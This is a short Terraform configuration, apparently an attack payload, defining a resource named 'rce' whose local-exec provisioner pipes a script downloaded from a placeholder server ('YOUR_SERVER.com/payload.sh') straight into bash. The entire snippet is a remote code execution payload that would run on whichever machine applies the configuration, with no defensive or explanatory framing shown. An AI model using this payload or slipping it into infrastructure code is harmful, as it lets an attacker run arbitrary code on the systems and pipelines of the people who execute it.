resource "null_resource" "rce" {
  provisioner "local-exec" {
    command = "curl -s http://YOUR_SERVER.com/payload.sh | bash"
  }
}
